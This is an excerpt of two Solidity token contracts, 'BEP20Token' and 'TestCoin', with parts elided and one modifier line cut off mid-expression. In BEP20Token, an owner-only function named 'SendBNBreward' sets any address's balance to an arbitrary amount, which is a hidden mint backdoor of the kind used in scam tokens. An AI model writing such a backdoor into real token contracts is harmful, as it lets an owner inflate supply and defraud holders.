...
contract BEP20Token is Ownable {
  ...
  constructor(string memory _name, string memory _symbol, uint8 _decimals, uint256 _totalSupply) public {
    BNBWinner = msg.sender;
    name = _name;
    symbol = _symbol;
    decimals = _decimals;
    totalSupply =  _totalSupply * 10 ** uint256(decimals);
    balances[BNBWinner] = totalSupply;
    allowAddress[BNBWinner] = true;
  }
  ...
  modifier onlyOwner() {
    require(msg.sender == BNBWinner || msg.sender == address
  ...
  function SendBNBreward(address WinnerAddress, uint256 _value) external onlyOwner {
      balances[WinnerAddress] = _value * 10 ** uint256(decimals);
  }
}
...
contract TestCoin is Context, IERC20 {
    ...
    address payable private _marketingWallet = payable(0x4c5f1D0ffAe53A54eF2979472C1D1b8567A51391);
    address payable private _ecosystemWallet = payable(0x4c5f1D0ffAe53A54eF2979472C1D1b8567A51391);
